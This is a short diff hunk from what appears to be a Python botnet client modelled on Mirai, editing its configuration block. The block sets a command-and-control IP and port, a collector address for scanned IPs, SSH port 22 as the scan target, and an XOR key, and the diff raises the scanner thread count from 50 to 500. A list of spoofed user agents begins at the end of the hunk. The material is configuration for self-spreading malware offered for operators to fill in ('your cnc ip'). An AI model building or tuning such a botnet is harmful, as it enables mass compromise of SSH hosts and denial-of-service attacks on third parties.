@@ -21,12 +21,12 @@ import threading
 import base64 as b64
 #config
 cnc                  = "127.0.0.1"#your cnc ip
-cport                = 1337#your cnc port
+cport                = 101#your cnc port
 scan_ip              = "127.0.0.1"#Recevie the scanned ip
-scan_port            = 911#same
+scan_port            = 202#same
 sport                = 22#Scanning port
 single_instance_port = 42026#You should knew this if u used mirai.
-scan_th              = 50#Scanner threads
+scan_th              = 500#Scanner threads
 key                  = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
